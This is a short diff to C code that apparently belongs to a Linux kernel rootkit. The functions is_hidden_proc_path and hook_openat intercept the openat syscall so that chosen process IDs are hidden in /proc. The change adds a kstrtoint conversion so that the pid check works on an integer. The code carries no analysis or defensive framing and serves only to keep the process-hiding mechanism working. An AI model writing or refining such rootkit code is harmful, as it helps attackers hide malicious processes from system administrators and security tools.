@@ -14,7 +14,7 @@ static notrace bool is_hidden_proc_path(const char __user *pathname)
     char buf[PATH_BUF_SIZE];
     long copied;
     char pid_buf[16] = {0};
-    int i = 0;
+    int i = 0, pid;
 
     if (!pathname)
         return false;
@@ -42,7 +42,10 @@ static notrace bool is_hidden_proc_path(const char __user *pathname)
     if (i == 0)
         return false;
 
-    return is_hidden_pid(pid_buf);
+    if (kstrtoint(pid_buf, 10, &pid) < 0)
+        return false;
+
+    return is_hidden_pid(pid);
 }
 
 static notrace asmlinkage long hook_openat(const struct pt_regs *regs)
